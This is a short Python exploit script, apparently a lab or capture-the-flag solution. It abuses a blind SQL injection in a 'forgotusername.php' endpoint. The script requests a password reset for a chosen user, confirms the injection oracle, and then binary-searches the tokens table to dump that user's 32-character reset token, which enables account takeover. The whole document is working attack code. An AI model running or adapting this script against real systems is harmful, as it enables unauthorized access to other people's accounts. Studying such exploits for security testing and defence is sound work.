#!/usr/bin/python3

# Dump the password reset token for a given user id,
# by abusing the blind sqli vulnerability in
# 'forgotusername.php'

import requests
import sys

if len(sys.argv) != 4:
	print('usage: %s TARGET USERNAME UID' % sys.argv[0])
	sys.exit(-1)

target   = sys.argv[1]
username = sys.argv[2]
uid      = sys.argv[3]

def request_reset(username):
	d = {'username':username}
	r = requests.post('http://%s/forgotpassword.php'%target, data=d)
	return 'Email sent!' in r.text

def oracle(q_left, q_op, q_right):	
	d = {'username':'admin\' and %s%s%s' % (q_left, q_op, q_right)}
	r = requests.post('http://%s/forgotusername.php'%target, data=d)
	return 'User exists!' in r.text

if oracle(1,'=',"\'1") != True or\
   oracle(0,'=',"\'1") != False:
	print('[-] Target is not vulnerable.')
	sys.exit(-1)

print('[+] Target is vulnerable.')

if request_reset(username):
	print('[+] Reset token created.')
else:
	print('[-] Failed while requesting password reset.')
	sys.exit(-1)

dumped = ""
sql_template = "(select ascii(substr(token,%d,1)) from tokens where uid=%s limit 1)"
for i in range(1,33):
	Found = False
	low = 32
	high = 127
	mid = 0
	while not Found and low <= high:
		mid = (high+low)//2
	
		if oracle(sql_template%(i,uid),'>',"'%d"%mid):
			low = mid+1
	
		elif oracle(sql_template%(i,uid),'<',"'%d"%mid):
			high = mid-1
	
		else:
			dumped += chr(mid)
			Found = True
print("[+] Token dumped: %s" % dumped)
